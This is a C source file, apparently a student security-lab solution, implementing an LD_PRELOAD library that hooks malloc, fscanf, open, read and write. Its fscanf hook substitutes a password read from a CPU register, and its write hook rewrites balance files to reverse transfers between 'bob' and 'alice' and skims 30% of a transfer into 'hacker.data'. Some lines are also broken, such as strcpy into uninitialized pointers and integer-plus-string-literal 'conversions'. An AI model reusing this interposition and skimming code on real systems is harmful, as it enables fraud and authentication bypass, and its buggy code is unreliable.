#include<stdint.h>
#include<stdio.h>
#include<stdlib.h>
#include<dlfcn.h>
#include<string.h>
#include<errno.h>
#include<execinfo.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<stdarg.h>
/* We aren't providing much code here.  You'll need to implement quite a bit
 * for your library. */

/* Declarations for the functions in part2_hash.cc, so that we don't need an
 * extra header file. */
void malloc_insert(size_t size);
void malloc_dump();
void so_allocate();
void so_deallocate();
void openBob(int fd,const char *filename);
void openAlice(int fd,const char *filename);
void closeBob();
void closeAlice();
int getBobFd();
int getAliceFd();
void setTask(int t);
int getTask();
void setDesc3(int val);
int getDesc3();
void setDesc4(int val);
int getDesc4();
void setTransfer(int val);
int getTransfer();

static int ignoreMalloc = 0;

void *malloc(size_t bytes)
{
	static void* (*origMalloc)(size_t) = NULL;
	if(!origMalloc)
	{
		origMalloc = (void* (*)(size_t))dlsym(RTLD_NEXT, "malloc");
	}

	if(ignoreMalloc)
	{
		return origMalloc(bytes);
	}

	ignoreMalloc = 1;
	malloc_insert(bytes);
	ignoreMalloc = 0;

	return origMalloc(bytes);
}


__attribute__((destructor))
static void deallocate()
{
	malloc_dump();
	so_deallocate();
}


__attribute__((constructor))
static void allocate()
{
	so_allocate();
}


int fscanf(FILE *stream, const char *format, ...){
	
	static int (*origFscanf)(FILE *,const char *, ...) = NULL;
	if(!origFscanf)
	{
		origFscanf = (int (*)(FILE*,const char*,...))dlsym(RTLD_NEXT, "fscanf");
	}	
	int count;
	va_list ap;
	va_start(ap, format);
	if(strcmp(format, "%ms") == 0){ //Password call
		register char* reg asm("r13");
		char **b = va_arg(ap, char**);
		char **buff = b;
		*buff =(char *)malloc(sizeof(char)*20); 
	//	strcpy(*buff, "turtle"); 
		strcpy(*buff, reg);
	/*
		char *usrname = getlogin();
		if(!usrname){
		//	perror("__getlogin1() error");
			printf("Error logging in \n");
			exit(0);
		}
		//printf("buff before strcat is %s \n", *buff);
		strcat(*buff, usrname);
		//printf("buff is %s \n", *buff);
	*/	
		count = 1;
	}
	else { //Call scanf properly
		count = origFscanf(stream, format, va_arg(ap, int*));
	}
	va_end(ap);
	return count;
}


//Task 2

int open(const char *pathname, int flags, ...){
	//va_list ap;
	//va_start(ap, flags);
//	printf("in open \n");
	//int mode = va_arg(int);
	static int (*origOpen)(const char *, int) = NULL;
	if(!origOpen)
	{
		origOpen = (int (*)(const char *, int))dlsym(RTLD_NEXT, "open");
	}
	
	int fd = origOpen(pathname, flags);


	//Set the task number which is opened for each task
	int t = atoi(pathname);
	printf("In open, pathname: %s, task:%d \n", pathname, t);
//	if((t < 10) && (t > 0)){ //Task opened
	if(t == 4){
		setTask(t);
	}

	//char readBuff[20];
	//read(fd, readBuff, 20);
	//printf("Read printed %s \n", readBuff);
//	printf("in open filename %s \n", pathname);
	//For task 2
	if(strcmp(pathname, "bob.data") == 0){ //Bobs getting opened
		openBob(fd, pathname);	
		printf("open bob \n");

	}
	if(strcmp(pathname, "alice.data") == 0){
		openAlice(fd, pathname);
		printf("open alice \n");
	}
	return fd;
}

/*int open(const char *pathname, int flags, mode_t mode){
	printf("in second open filename %s  \n", pathname);
	return 0;
}*/
	

int close(int fd){
	int retval;
	static int (*origClose)(int) = NULL;
	if(!origClose){
		origClose = (int (*)(int))dlsym(RTLD_NEXT, "close");
	}
	retval = origClose(fd);
	
	closeBob(fd);
	closeAlice(fd);
	return retval;

}



ssize_t write(int handle, const void *buffer, size_t nbyte){
	static int (*origWrite)(int,const void*, size_t) = NULL;
	int retval;
	if(!origWrite)
	{
		origWrite = (int (*)(int,const void*, size_t))dlsym(RTLD_NEXT, "write");
	}

	//If writing to bob and alice - must change their buffers before writing 
	
	char *buff;

	//Task 4
	printf("In write, task is %d: \n", getTask());
	int task = getTask();
	if(task == 4){
		printf("in task 4 \n");
		if(handle == 3) { //The file getting the transfer	
			int updated_value = atoi(buffer);
			int prev_val = getDesc3();
			int diff = prev_val - updated_value;
			
			setTransfer(prev_val - updated_value);
			printf("Transfer val = %d \n", diff);
		}
		else if(handle ==4){
			printf("In handle is 4: \n");
			int prev_val = getDesc4();
			printf("prev val is %d \n", prev_val);
			int transfer_amount = getTransfer();
			int transfer_to_hacker = transfer_amount*0.30;
			transfer_amount -= transfer_to_hacker;
			printf("transfer to hacker amount: %d \n", transfer_to_hacker);
			printf("transfer amount %d \n", transfer_amount);

			//Transfer to hacker
			int hacker_fd;
		
			char *hacker_val = (char *)malloc(sizeof(char)*20);
			hacker_fd = open("hacker.data", O_RDWR);
			read(hacker_fd, hacker_val, 20);
			int amount_to_write = strlen(hacker_val);
			int hack_val = atoi(hacker_val);
			hack_val += transfer_to_hacker; //Add to hacker ;
			sprintf(hacker_val, "%d", hack_val);
			//strcpy(hacker_val, (char *)hack_val);
			printf("hacker val: %s and hack_val: %d \n", hacker_val, hack_val);
			printf("transfer amoutn is: %d \n", transfer_to_hacker);
			ftruncate(hacker_fd, 0);
			lseek(hacker_fd, 0, SEEK_SET);
			origWrite(hacker_fd, hacker_val, amount_to_write);
			free(hacker_val);
			close(hacker_fd);

			//Update value to write to desc 4
			int write_amount = prev_val + transfer_amount;
			char *write_amount_to_4;
			strcpy(write_amount_to_4, ""+write_amount);
			strcpy(buff, write_amount_to_4);
		}

	}
	if((task != 4) && (handle != 4)){ //Take care of buffer being constant
		strcpy(buff, buffer);
	}

	int bob_fd = getBobFd();  // = fileno("bob.data");
	int alice_fd = getAliceFd(); ; // = fileno("alice.data");

//	printf("in write bobs fd:%d alices fd:%d handle:%d\n", bob_fd, alice_fd, handle);

	if((bob_fd != -1) && (alice_fd != -1)){ //Bob is open
		printf("in first if \n");
		if(handle == bob_fd){
			printf("in second if \n");
			char buf[20]; //Old buffer
			if(read(handle, buf, 20) == 3){ //Read 3 digits
				printf("in read if - buf is %s \n", buf);
				int diff = atoi(buffer) - atoi(buf); //100 would be added
				if(diff == 100){
					printf("in diff == 100 \n");
					char newBuff[20];
					strcpy(newBuff, (atoi(buf)-100)+"");
					printf("new buff is %s \n", newBuff);
					retval = origWrite(handle, newBuff, 3); //itoa(atoi(buf)-100), 3);
					return retval;
				}
			}
		}else if(alice_fd == handle){
			char buf[20];
			if(read(handle, buf, 20) == 3){ //Read 3 digits
				int diff =  atoi(buf) - atoi(buffer); //100 would be subtracted
				if(diff == 100){
					char newBuff[20];
					strcpy(newBuff, (atoi(buf)+100)+"");
					retval = origWrite(handle, newBuff, 3); //itoa(atoi(buf)-100), 3);
					return retval; //Break out of function
				}
			}

		}
		else{
			retval = origWrite(handle,(const char *)buff, nbyte);
		}
	}else {
		retval = origWrite(handle, (const char *)buff, nbyte);
	}
	return retval;
}



ssize_t read(int handle, void *buf, size_t nbyte){
	static int (*origRead)(int,void*, size_t) = NULL;
	int retval;
	if(!origRead)
	{
		origRead = (int (*)(int, void*, size_t))dlsym(RTLD_NEXT, "read");
	}

	retval = origRead(handle, buf, nbyte);

	printf("read in %s \n", buf);
	int task = getTask();
	if(task == 4){
		int prev_val = atoi(buf);
		if(handle == 3){
			setDesc3(prev_val);
		}
		else if(handle == 4){
			setDesc4(prev_val);
		}
	}

	return retval;
	
}


